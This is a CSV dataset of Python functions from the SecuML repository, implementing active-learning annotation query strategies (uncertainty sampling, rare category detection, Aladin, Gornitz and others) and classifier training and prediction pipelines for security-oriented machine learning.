Repository,Function_Name,Function_Code
ANSSI-FR/SecuML,_gen_queries_from_scores,"def _gen_queries_from_scores(self):
    assert np.array_equal(self.lr_class_labels, self.nb_class_labels)
    lr_predicted_proba_df = self.gen_lr_predicted_proba_df()
    num_families = len(self.lr_class_labels)
    self.annotation_queries = []
    if self.num_annotations <= num_families:
        if self.iteration.iter_num % 2 == 0:
            classifier = 'lr'
        else:
            classifier = 'nb'
        sort_data_frame(self.scores, '%s_score' % classifier, True, True)
        selected_instances = self.scores.index.tolist()[:self.num_annotations]
        for instance_id in selected_instances:
            query = self.generate_query(instance_id, 0, None, None)
            self.add_query(query)
        return
    num_uncertain = [0] * num_families
    num_anomalous = [0] * num_families
    families_scores = self._gen_families_scores_tables()
    num_annotations = 0
    stop = False
    selected_instances = []
    while not stop:
        for (i, family) in enumerate(list(self.lr_class_labels)):
            if num_uncertain[i] <= num_anomalous[i]:
                classifier = 'lr'
                num_uncertain[i] += 1
            else:
                classifier = 'nb'
                num_anomalous[i] += 1
            scores = families_scores[classifier][i]
            selected_rows = scores.loc[scores['queried'] == false()]
            if len(selected_rows) > 0:
                query = selected_rows.index.tolist()[0]
            else:
                self.conf.logger.debug(family + ': no anomalous, no uncertain instances')
                selected_rows = lr_predicted_proba_df.loc[lr_predicted_proba_df['queried'] == false()]
                selected_rows = sort_data_frame(selected_rows, family, False, False)
                selection = selected_rows.index.tolist()
                if len(selection) == 0:
                    stop = True
                    break
                else:
                    query = selection[0]
            num_annotations += 1
            selected_instances.append(query)
            for c in ['nb', 'lr']:
                predicted_class = self.scores.loc[query, c + '_prediction']
                predicted_class_index = np.where(self.lr_class_labels == predicted_class)[0][0]
                selected_df = families_scores[c][predicted_class_index]
                selected_df.at[query, 'queried'] = True
            self.scores.at[query, 'queried'] = True
            lr_predicted_proba_df.at[query, 'queried'] = True
            if num_annotations >= self.num_annotations:
                stop = True
                break
    for instance_id in selected_instances:
        query = self.generate_query(instance_id, 0, None, None)
        self.add_query(query)"
ANSSI-FR/SecuML,gen_lr_predicted_proba_df,"def gen_lr_predicted_proba_df(self):
    num_test_instances = self.test_instances.num_instances()
    lr_predicted_proba_df = pd.DataFrame(np.zeros((num_test_instances, len(self.lr_class_labels) + 1)), index=self.test_instances.ids.get_ids(), columns=list(self.lr_class_labels) + ['queried'])
    if num_test_instances > 0:
        lr_predicted_proba_df.iloc[:, :-1] = self.lr_predicted_proba
        lr_predicted_proba_df['queried'] = [False] * num_test_instances
    return lr_predicted_proba_df"
ANSSI-FR/SecuML,_gen_families_scores_tables,"def _gen_families_scores_tables(self, classifier=None):
    if classifier is None:
        families_scores = {}
        families_scores['lr'] = self._gen_families_scores_tables('lr')
        families_scores['nb'] = self._gen_families_scores_tables('nb')
        return families_scores
    families_scores = []
    for (i, family) in enumerate(list(self.lr_class_labels)):
        selection = self.scores[classifier + '_prediction']
        if selection.shape[0] > 0:
            family_scores = self.scores.loc[self.scores[classifier + '_prediction'] == family]
            family_scores = sort_data_frame(family_scores, '%s_score' % classifier, True, False)
        else:
            col_values = self.scores.columns.values
            family_scores = pd.DataFrame(columns=col_values)
        families_scores.append(family_scores)
    return families_scores"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, instances, assigned_categories, assignment_proba, label, category_labels):
    self.iteration = iteration
    self.instances = instances
    self.generate(assigned_categories, assignment_proba, label, category_labels)"
ANSSI-FR/SecuML,init,"def init(self, label, families):
    self.categories = [Category(self.iteration, label, families[x]) for x in range(self.num_categories)]"
ANSSI-FR/SecuML,num_categories,"def num_categories(self):
    return self.num_categories"
ANSSI-FR/SecuML,generate,"def generate(self, assigned_categories, assignment_proba, label, category_labels):
    self.assigned_categories = assigned_categories
    self.num_categories = len(set(assigned_categories))
    self.init(label, category_labels)
    for (i, instance_id) in enumerate(self.instances.ids.get_ids()):
        annotated = self.instances.annotations.is_annotated(instance_id)
        c = self.assigned_categories[i]
        probas = None
        if assignment_proba is not None:
            probas = assignment_proba[i, :]
        self.categories[c].add_instance(instance_id, probas, annotated)
    for c in range(self.num_categories):
        self.categories[c].final_computation()"
ANSSI-FR/SecuML,export,"def export(self, filename):
    obj = {}
    for c in range(self.num_categories):
        obj[self.categories[c].family] = self.categories[c].export()
    with open(filename, 'w') as f:
        json.dump(obj, f, indent=2)"
ANSSI-FR/SecuML,annotate_auto,"def annotate_auto(self):
    for category in self.categories:
        category.annotate_auto()"
ANSSI-FR/SecuML,get_manual_annotations,"def get_manual_annotations(self):
    for category in self.categories:
        category.get_manual_annotations()"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, conf, already_queried=None):
    self.set_category_num_annotations(conf)
    for category in self.categories:
        category.generate_queries(conf.cluster_strategy, already_queried=already_queried)"
ANSSI-FR/SecuML,set_category_num_annotations,"def set_category_num_annotations(self, conf):
    weights = np.full((self.num_categories,), 1 / self.num_categories)
    num_annotations = conf.num_annotations
    annotations = np.full((self.num_categories,), None)
    card = [self.categories[c].num_instances() - self.categories[c].num_annotated_instances for c in range(self.num_categories)]
    sum_card = sum(card)
    if num_annotations > sum_card:
        num_annotations = sum_card
        self.iteration.conf.logger.warning('The number of instances is smaller than the requested number of annotation queries. The number of annotation queries is set to %d.' % sum_card)
    num_remaining_annotations = num_annotations
    no_starve_cluster = False
    while not no_starve_cluster:
        no_starve_cluster = True
        weights = weights / np.sum(weights)
        for c in range(self.num_categories):
            if annotations[c] is not None:
                continue
            num = int(weights[c] * num_remaining_annotations)
            if card[c] <= num:
                annotations[c] = card[c]
                weights[c] = 0
                no_starve_cluster = False
        num_annotated = np.sum(annotations != None)
        num_remaining_annotations = num_annotations - num_annotated
        if num_remaining_annotations == 0:
            break
    for c in range(self.num_categories):
        if annotations[c] is not None:
            continue
        num = int(weights[c] * num_remaining_annotations)
        annotations[c] = num
    num_remaining_annotations = num_annotations - sum(annotations)
    while num_remaining_annotations > 0:
        shuffled_clusters = list(range(self.num_categories))
        random.shuffle(shuffled_clusters)
        for c in shuffled_clusters:
            if num_remaining_annotations == 0:
                break
            if card[c] > annotations[c]:
                annotations[c] += 1
                num_remaining_annotations -= 1
    for (c, num) in enumerate(annotations):
        self.categories[c].set_num_annotations(num)
    return annotations"
ANSSI-FR/SecuML,set_likelihood,"def set_likelihood(self):
    naive_bayes = self.train_naive_bayes()
    features = self.instances.features.get_values()
    for c in range(self.num_categories):
        mask = self.assigned_categories == c
        c_features = features[mask, :]
        c_likelihood = naive_bayes.log_likelihood(c_features, str(c))
        self.categories[c].set_likelihood(c_likelihood)"
ANSSI-FR/SecuML,train_naive_bayes,"def train_naive_bayes(self):
    naive_bayes_conf = self.get_naive_bayes_conf()
    families = self.instances.annotations.get_families()
    current_families = copy.deepcopy(families)
    self.instances.annotations.set_families(self.assigned_categories)
    naive_bayes = GaussianNaiveBayes(naive_bayes_conf)
    naive_bayes.training(self.instances)
    self.instances.annotations.set_families(current_families)
    return naive_bayes"
ANSSI-FR/SecuML,get_naive_bayes_conf,"def get_naive_bayes_conf(self):
    return None"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, label=None, family=None):
    Queries.__init__(self, iteration, label=label)
    self.assign_label_family(label, family)
    self.instances_ids = []
    self.probas = []
    self.entropy = []
    self.likelihood = []
    self.df = None
    self.num_annotations = None
    self.annotated_instances = []
    self.num_annotated_instances = 0"
ANSSI-FR/SecuML,export,"def export(self):
    return {'instance_ids': self.get_ids(), 'confidence': self.get_confidences(), 'label': self.label}"
ANSSI-FR/SecuML,assign_label_family,"def assign_label_family(self, label, family):
    self.family = family
    if label != 'all':
        self.label = label
    else:
        self.label = label"
ANSSI-FR/SecuML,num_instances,"def num_instances(self):
    return len(self.instances_ids)"
ANSSI-FR/SecuML,set_num_annotations,"def set_num_annotations(self, num_annotations):
    self.num_annotations = num_annotations"
ANSSI-FR/SecuML,add_instance,"def add_instance(self, instance_id, probas, annotated):
    self.instances_ids.append(instance_id)
    entropy = None
    proba = None
    likelihood = None
    if probas is not None:
        entropy = scipy.stats.entropy(probas)
        proba = max(probas)
    self.entropy.append(entropy)
    self.probas.append(proba)
    self.likelihood.append(likelihood)
    if annotated:
        self.annotated_instances.append(instance_id)
        self.num_annotated_instances += 1"
ANSSI-FR/SecuML,final_computation,"def final_computation(self):
    self.df = pd.DataFrame({'proba': self.probas, 'entropy': self.entropy, 'likelihood': self.likelihood}, index=list(map(str, self.instances_ids)))"
ANSSI-FR/SecuML,set_likelihood,"def set_likelihood(self, likelihood):
    self.likelihood = likelihood
    self.df['likelihood'] = likelihood"
ANSSI-FR/SecuML,get_likelihood,"def get_likelihood(self, instances):
    df = pd.DataFrame({'likelihood': self.likelihood}, index=list(map(str, self.instances_ids)))
    selected_df = df.loc[list(map(str, instances)), :]
    return selected_df['likelihood'].tolist()"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj):
    category = Category()
    category.instances_ids = obj['instances_ids']
    category.label = obj['label']
    return category"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, cluster_strategy, already_queried=None):
    queries_types = cluster_strategy.split('_')
    num_queries_types = len(queries_types)
    if already_queried is None:
        already_queried = []
    for (q, queries_type) in enumerate(queries_types):
        drop_instances = already_queried[:]
        drop_instances.extend(self.annotated_instances)
        if q == num_queries_types - 1:
            num_queries = self.num_annotations - len(self.annotation_queries)
        else:
            num_queries = self.num_annotations // num_queries_types
        if num_queries == 0:
            continue
        queries_df = self._get_selected_instances(drop_instances)
        if queries_type == 'center':
            confidence = 'high'
            sort_data_frame(queries_df, 'likelihood', False, True)
            queries_df = queries_df.head(num_queries)
        elif queries_type == 'anomalous':
            confidence = 'low'
            sort_data_frame(queries_df, 'likelihood', True, True)
            queries_df = queries_df.head(num_queries)
        elif queries_type == 'uncertain':
            confidence = 'low'
            sort_data_frame(queries_df, 'entropy', False, True)
            queries_df = queries_df.head(num_queries)
        elif queries_type == 'random':
            confidence = 'low'
            queries_df = queries_df.sample(n=num_queries, axis=0)
        else:
            raise ValueError()
        self._add_queries(confidence, queries_df)"
ANSSI-FR/SecuML,_add_queries,"def _add_queries(self, confidence, queries_df):
    for (index, row) in queries_df.iterrows():
        query = self.generate_query(int(index), row['likelihood'], self.label, self.family, confidence=confidence)
        self.add_query(query)
        self.annotated_instances.append(int(index))"
ANSSI-FR/SecuML,_get_selected_instances,"def _get_selected_instances(self, drop_instances):
    selected_instances = self.instances_ids
    if drop_instances is not None:
        selected_instances = [x for x in selected_instances if x not in drop_instances]
    return self.df.loc[list(map(str, selected_instances)), :]"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, b, num_annotations):
    Queries.__init__(self, iteration)
    self.b = b
    self.num_annotations = num_annotations"
ANSSI-FR/SecuML,run_models,"def run_models(self):
    return"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, already_queried=None):
    instances = self.predictions.ids.ids
    if self.predictions.info.with_scores:
        predicted_scores = self.predictions.scores
    elif self.predictions.info.with_probas:
        predicted_scores = self.predictions.probas - 0.5
    else:
        assert False
    proba = [self.b / (self.b + abs(s)) for s in predicted_scores]
    predictions_df = pd.DataFrame({'proba': proba}, index=instances)
    if already_queried is not None:
        predictions_df.drop(labels=already_queried, inplace=True)
    if len(predictions_df.index) < self.num_annotations:
        selected_df = predictions_df
    else:
        norm_proba = [p / sum(proba) for p in proba]
        selection = list(np.random.choice(instances, size=self.num_annotations, replace=False, p=norm_proba))
        selected_df = predictions_df.loc[selection]
    for (index, row) in selected_df.iterrows():
        query = self.generate_query(index, row['proba'], None, None)
        self.add_query(query)"
ANSSI-FR/SecuML,_generate_label,"def _generate_label(x):
    if x is None:
        return 0
    if x:
        return -1
    else:
        return 1"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, num_annotations):
    Queries.__init__(self, iteration)
    self.num_annotations = num_annotations
    self.num_neighbours = 10
    self.delta = 0.5"
ANSSI-FR/SecuML,run_models,"def run_models(self):
    return"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, already_queried=None):
    predicted_scores = self.predictions.scores
    if len(predicted_scores) == 0:
        return
    boundary_scores = abs(predicted_scores) / max(abs(predicted_scores))
    neighbours_scores = self._compute_neighbours_scores()
    global_scores = self.delta * boundary_scores
    global_scores += (1 - self.delta) * neighbours_scores
    queries_df = pd.DataFrame(data={'scores': predicted_scores, 'boundary_scores': boundary_scores, 'neighbours_scores': neighbours_scores, 'global_scores': global_scores}, index=self.predictions.ids.ids)
    if already_queried is not None:
        queries_df.drop(labels=already_queried, inplace=True)
    sort_data_frame(queries_df, 'global_scores', True, True)
    queries_df = queries_df.head(n=self.num_annotations)
    for (index, row) in queries_df.iterrows():
        query = self.generate_query(index, row['scores'], None, None)
        self.add_query(query)"
ANSSI-FR/SecuML,_compute_neighbours_scores,"def _compute_neighbours_scores(self):
    all_instances = self.iteration.datasets.instances
    pipeline = Pipeline([('scaler', StandardScaler()), ('model', NearestNeighbors(self.num_neighbours, n_jobs=-1))])
    pipeline.fit(all_instances.features.get_values())
    labels = np.array([_generate_label(x) for x in all_instances.annotations.get_labels()])
    scores = []
    all_neighbours = pipeline['model'].kneighbors(return_distance=False)
    for (i, label) in enumerate(labels):
        if label != 0:
            continue
        else:
            neighbours = all_neighbours[i]
            score = sum(labels[neighbours] + 1) / (2.0 * self.num_neighbours)
            scores.append(score)
    return np.array(scores)"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, num_annotations):
    Queries.__init__(self, iteration)
    self.num_annotations = num_annotations"
ANSSI-FR/SecuML,run_models,"def run_models(self):
    return"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, already_queried=None):
    selection = self.predictions.get_random(self.num_annotations, already_queried)
    for prediction in selection:
        query = self.generate_query(prediction.instance_id, prediction.proba, None, None)
        self.add_query(query)"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'Rare category detection requires that the initial annotated dataset contains at least two different families.'"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, label, proba_min=None, proba_max=None, input_checking=True):
    Queries.__init__(self, iteration, label=label)
    self.proba_min = proba_min
    self.proba_max = proba_max
    self.rcd_conf = self.iteration.conf.rcd_conf
    self.multiclass_model = None
    self._check_input_data(input_checking)"
ANSSI-FR/SecuML,_check_input_data,"def _check_input_data(self, input_checking):
    instances = self.iteration.datasets.instances
    self.annotated_instances = instances.get_annotated_instances(label=self.label)
    annotations = self.annotated_instances.annotations
    families_counts = annotations.get_families_count()
    if len(families_counts) < 2:
        self.families_analysis = False
    else:
        families_counts = [(k, x) for (k, x) in families_counts.items()]
        families_counts.sort(key=lambda tup: tup[1], reverse=True)
        self.families_analysis = families_counts[1][1] >= 2
    if input_checking and (not self.families_analysis):
        raise RareCategoryAtLeastTwoFamilies()"
ANSSI-FR/SecuML,run,"def run(self, predictions, already_queried=None):
    Queries.run(self, predictions, already_queried=already_queried)
    self._gen_clustering_visu()"
ANSSI-FR/SecuML,_set_predictions,"def _set_predictions(self, predictions):
    if self.proba_min is not None and self.proba_max is not None:
        self.predictions = predictions.get_within_range(self.proba_min, self.proba_max)
    else:
        self.predictions = predictions.to_list()"
ANSSI-FR/SecuML,run_models,"def run_models(self):
    if self.families_analysis:
        self.annotations_type = 'families'
        start_time = time.time()
        self._build_categories()
        self.analysis_time = time.time() - start_time
        self.categories.set_likelihood()
    else:
        self.annotations_type = 'individual'
        self.categories = None
        self.analysis_time = 0"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, already_queried=None):
    num_annotations = self.rcd_conf.num_annotations
    if not self.families_analysis:
        indexes = range(len(self.predictions))
        if already_queried is not None:
            indexes = [i for i in indexes if self.predictions[i].instance_id not in already_queried]
        if len(indexes) > num_annotations:
            indexes = random.sample(indexes, num_annotations)
        for i in indexes:
            p = self.predictions[i]
            query = self.generate_query(p.instance_id, p.proba, self.label, None)
            self.add_query(query)
    else:
        self.categories.generate_queries(self.rcd_conf, already_queried=already_queried)"
ANSSI-FR/SecuML,export,"def export(self):
    if not self.families_analysis:
        Queries.export(self)
    else:
        filename = path.join(self.iteration.iteration_dir, 'toannotate_%s.json' % self.label)
        self.categories.export(filename)"
ANSSI-FR/SecuML,annotate_auto,"def annotate_auto(self):
    if not self.families_analysis:
        Queries.annotate_auto(self)
    else:
        self.categories.annotate_auto()"
ANSSI-FR/SecuML,get_manual_annotations,"def get_manual_annotations(self):
    if not self.families_analysis:
        Queries.get_manual_annotations(self)
    else:
        self.categories.get_manual_annotations()"
ANSSI-FR/SecuML,_build_categories,"def _build_categories(self):
    (train, test, test_predictions) = self._build_multiclass_classifier()
    all_instances = copy.deepcopy(test)
    all_instances.union(train)
    if test.num_instances() > 0:
        predicted_families = test_predictions.values
        all_families = list(predicted_families)
        all_families.extend(train.annotations.get_families())
        predicted_proba = test_predictions.all_probas
        for family in train.annotations.get_families():
            probas = self.multiclass_model.class_labels == family
            probas = probas.astype('int')
            predicted_proba = np.vstack((predicted_proba, np.array(probas)))
    else:
        all_families = self.annotated_instances.annotations.get_families()
        predicted_proba = None
        for family in all_families:
            probas = [int(family == s) for s in self.multiclass_model.class_labels]
            if predicted_proba is None:
                predicted_proba = np.array(probas)
            else:
                predicted_proba = np.vstack((predicted_proba, np.array(probas)))
    labels_values = list(self.multiclass_model.class_labels)
    assigned_categories = np.array([labels_values.index(x) for x in all_families])
    self._set_categories(all_instances, assigned_categories, predicted_proba)"
ANSSI-FR/SecuML,_set_categories,"def _set_categories(self, all_instances, assigned_categories, predicted_proba):
    self.categories = Categories(self.iteration, all_instances, assigned_categories, predicted_proba, self.label, self.multiclass_model.class_labels)"
ANSSI-FR/SecuML,_get_multiclass_conf,"def _get_multiclass_conf(self):
    return self.rcd_conf.classification_conf.classifier_conf"
ANSSI-FR/SecuML,_build_multiclass_classifier,"def _build_multiclass_classifier(self):
    multiclass_conf = self._get_multiclass_conf().classifier_conf
    predicted_ids = [p.instance_id for p in self.predictions]
    instances = self.iteration.datasets.instances
    predicted_instances = instances.get_from_ids(predicted_ids)
    if self.multiclass_model is None:
        self.multiclass_model = multiclass_conf.model_class(multiclass_conf)
        self.multiclass_model.training(self.annotated_instances)
        (predictions, _) = self.multiclass_model.testing(predicted_instances)
    return (self.annotated_instances, predicted_instances, predictions)"
ANSSI-FR/SecuML,_gen_clustering_visu,"def _gen_clustering_visu(self):
    if self.families_analysis:
        clusters = Clusters(self.categories.instances, self.categories.assigned_categories)
        clusters.generate(None, None)"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, num_annotations):
    Queries.__init__(self, iteration)
    self.num_annotations = num_annotations"
ANSSI-FR/SecuML,run_models,"def run_models(self):
    return"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, already_queried=None):
    assert not already_queried
    selection = self.predictions.get_alerts(top_n=self.num_annotations)
    for prediction in selection:
        query = self.generate_query(prediction.instance_id, prediction.proba, None, None)
        self.add_query(query)"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, num_annotations, label=None):
    Queries.__init__(self, iteration, label=label)
    self.num_annotations = num_annotations"
ANSSI-FR/SecuML,run_models,"def run_models(self):
    return"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, already_queried=None):
    unsure_df = pd.DataFrame({'proba': self.predictions.probas}, index=self.predictions.ids.ids)
    if already_queried is not None:
        unsure_df.drop(labels=already_queried, inplace=True)
    unsure_df['proba'] = abs(unsure_df['proba'] - 0.5)
    sort_data_frame(unsure_df, 'proba', True, True)
    if self.num_annotations is not None and len(unsure_df) > self.num_annotations:
        unsure_df = unsure_df.head(n=self.num_annotations)
    for (instance_id, row) in unsure_df.iterrows():
        query = self.generate_query(instance_id, row['proba'], None, None)
        self.add_query(query)"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration):
    self.iteration = iteration
    self.conf = self.iteration.conf
    self.queries = {}
    self._set_queries()"
ANSSI-FR/SecuML,_set_queries,"@abc.abstractmethod
def _set_queries():
    return"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, predictions):
    self.exec_time = 0
    queried_instances = []
    for (_, query) in self.queries.items():
        query.run(predictions, already_queried=queried_instances)
        queried_instances.extend(query.get_ids())
        self.exec_time += query.exec_time"
ANSSI-FR/SecuML,annotate_auto,"def annotate_auto(self):
    for (_, query) in self.queries.items():
        query.annotate_auto()"
ANSSI-FR/SecuML,get_manual_annotations,"def get_manual_annotations(self):
    for (_, query) in self.queries.items():
        query.get_manual_annotations()"
ANSSI-FR/SecuML,get_exec_times_header,"def get_exec_times_header(self):
    return ['generate_queries']"
ANSSI-FR/SecuML,get_exec_times,"def get_exec_times(self):
    return [self.exec_time]"
ANSSI-FR/SecuML,get_exec_times_display,"def get_exec_times_display(self):
    generate_queries = PlotDataset(np.array([]), 'Queries generation')
    generate_queries.set_color('purple')
    return [generate_queries]"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['aladin'] = AladinQueries(self.iteration, self.conf)"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['cesa_bianchi'] = CesaBianchiQueries(self.iteration, self.iteration.conf.b, self.iteration.conf.batch)"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['gornitz'] = GornitzQueries(self.iteration, self.iteration.conf.batch)"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['uncertain'] = UncertainQueries(self.iteration, self.iteration.conf.num_uncertain, label='uncertain')
    self.queries['malicious'] = RcdQueries(self.iteration, MALICIOUS, 0.5, 1, input_checking=False)
    self.queries['benign'] = RcdQueries(self.iteration, BENIGN, 0, 0.5, input_checking=False)"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['random'] = RandomQueries(self.iteration, self.iteration.conf.batch)"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['rcd'] = RcdQueries(self.iteration, 'all')"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['top_n'] = TopNQueries(self.iteration, self.iteration.conf.batch)"
ANSSI-FR/SecuML,_set_queries,"def _set_queries(self):
    self.queries['uncertain'] = UncertainQueries(self.iteration, self.iteration.conf.batch)"
ANSSI-FR/SecuML,__init__,"def __init__(self, model_class):
    self.model_class = model_class.__class__.__name__"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return '%s does not support CV monitoring.' % self.model_class"
ANSSI-FR/SecuML,__init__,"def __init__(self, training, best_hyper_params):
    self.training = training
    self.best_hyper_params = best_hyper_params"
ANSSI-FR/SecuML,add,"def add(self, exec_time):
    self.training += exec_time.training
    self.best_hyper_params += exec_time.best_hyper_params"
ANSSI-FR/SecuML,total,"def total(self):
    return self.training + self.best_hyper_params"
ANSSI-FR/SecuML,__init__,"def __init__(self, predictions, num_instances):
    self.predictions = predictions
    self.num_instances = num_instances"
ANSSI-FR/SecuML,add,"def add(self, exec_time):
    self.predictions += exec_time.predictions
    self.num_instances += exec_time.num_instances"
ANSSI-FR/SecuML,__init__,"def __init__(self, conf):
    self.conf = conf
    self.class_labels = None
    self._create_pipeline()"
ANSSI-FR/SecuML,_get_pipeline,"@abc.abstractmethod
def _get_pipeline(self):
    return"
ANSSI-FR/SecuML,_set_best_hyperparam,"@abc.abstractmethod
def _set_best_hyperparam(self, train_instances):
    return"
ANSSI-FR/SecuML,training,"def training(self, instances):
    best_hyper_params_time = 0
    if self.conf.hyperparam_conf.get_param_grid() is not None:
        start = time.time()
        self._set_best_hyperparam(instances)
        best_hyper_params_time = time.time() - start
    start = time.time()
    self._fit(instances)
    train_time = time.time() - start
    return TrainingExecTimes(train_time, best_hyper_params_time)"
ANSSI-FR/SecuML,update,"def update(self, instances):
    start = time.time()
    self._update(instances)
    train_time = time.time() - start
    return TrainingExecTimes(train_time, 0)"
ANSSI-FR/SecuML,testing,"def testing(self, instances):
    start = time.time()
    predictions = self._get_predictions(instances)
    exec_time = time.time() - start
    return (predictions, PredictionsExecTime(exec_time, instances.num_instances()))"
ANSSI-FR/SecuML,load_model,"def load_model(self, model_filename):
    self.pipeline = joblib.load(model_filename)"
ANSSI-FR/SecuML,get_coefs,"def get_coefs(self):
    return self.conf.get_coefs(self.pipeline['model'])"
ANSSI-FR/SecuML,_create_pipeline,"def _create_pipeline(self):
    self.pipeline = Pipeline(self._get_pipeline())"
ANSSI-FR/SecuML,_get_predictions,"def _get_predictions(self, instances):
    predictions = self.apply_pipeline(instances)
    if instances.has_ground_truth():
        ground_truth = self.conf.get_supervision(instances, ground_truth=True, check=False)
        predictions.set_ground_truth(ground_truth)
    return predictions"
ANSSI-FR/SecuML,_fit,"@abc.abstractmethod
def _fit(self, train_instances):
    return"
ANSSI-FR/SecuML,_update,"def _update(self, train_instances):
    self._fit(train_instances)"
ANSSI-FR/SecuML,cv_monitoring,"def cv_monitoring(self, train_instances, cv_monitoring):
    from secuml.core.classif.conf.test.cv import CvConf
    num_folds = cv_monitoring.num_folds
    cv_test_conf = CvConf(self.conf.logger, num_folds)
    cv_datasets = cv_test_conf.gen_datasets(self.conf, train_instances)
    for (fold_id, datasets) in enumerate(cv_datasets._datasets):
        start = time.time()
        self.pipeline.fit(datasets.train_instances.features.get_values(), self.conf.get_supervision(datasets.train_instances))
        train_time = time.time() - start
        (cv_predictions, test_time) = self.testing(datasets.test_instances)
        cv_monitoring.add_fold(self, TrainingExecTimes(train_time, 0), cv_predictions, test_time, fold_id)"
ANSSI-FR/SecuML,apply_pipeline,"def apply_pipeline(self, instances):
    num_instances = instances.num_instances()
    if num_instances == 0:
        return Predictions(np.array([]), instances.ids, self.conf.multiclass)
    return self._predict(instances.features, instances.ids)"
ANSSI-FR/SecuML,_predict,"def _predict(self, features, instances_ids):
    if features.streaming:
        return self._predict_streaming(features.get_values(), instances_ids, features.stream_batch)
    else:
        return self._predict_matrix(features.get_values(), instances_ids)"
ANSSI-FR/SecuML,_predict_matrix,"def _predict_matrix(self, matrix, instances_ids):
    (all_probas, probas) = self._predict_probas(matrix)
    if all_probas is None and probas is None:
        (all_scores, scores) = self._predict_scores(matrix)
        if all_scores is None and scores is None:
            values = self._predict_values(matrix)
        else:
            values = self._predict_from_scores(matrix, all_scores, scores)
    else:
        (all_scores, scores) = (None, None)
        values = self._predict_from_probas(matrix, all_probas, probas)
    if probas is not None:
        probas = probas[:, 1]
    return Predictions(values, instances_ids, self.conf.multiclass, all_probas=all_probas, probas=probas, all_scores=all_scores, scores=scores)"
ANSSI-FR/SecuML,_predict_streaming,"def _predict_streaming(self, features_iter, instances_ids, stream_batch):
    predictions = None
    num_batches = instances_ids.num_instances() // stream_batch
    num_remaining = instances_ids.num_instances() % stream_batch
    for (i, batch) in enumerate(range(num_batches)):
        matrix = np.vstack(tuple((next(features_iter) for _ in range(stream_batch))))
        ids = instances_ids.ids[i * stream_batch:(i + 1) * stream_batch]
        ids = instances_ids.get_from_ids(ids)
        predictions = self._update_streaming_predictions(predictions, matrix, ids)
    if num_remaining > 0:
        matrix = np.vstack(tuple((next(features_iter) for _ in range(num_remaining))))
        ids = instances_ids.ids[-num_remaining:]
        ids = instances_ids.get_from_ids(ids)
        predictions = self._update_streaming_predictions(predictions, matrix, ids)
    return predictions"
ANSSI-FR/SecuML,_update_streaming_predictions,"def _update_streaming_predictions(self, predictions, matrix, instances_ids):
    new_predictions = self._predict_matrix(matrix, instances_ids)
    if predictions is None:
        return new_predictions
    else:
        predictions.union(new_predictions)
        return predictions"
ANSSI-FR/SecuML,_predict_values,"def _predict_values(self, features):
    return self.pipeline.predict(features)"
ANSSI-FR/SecuML,_predict_probas,"def _predict_probas(self, features):
    all_predicted_proba = None
    predicted_proba = None
    if self.conf.probabilist:
        all_predicted_proba = self.pipeline.predict_proba(features)
        if self.conf.multiclass:
            predicted_proba = None
        else:
            predicted_proba = all_predicted_proba
    return (all_predicted_proba, predicted_proba)"
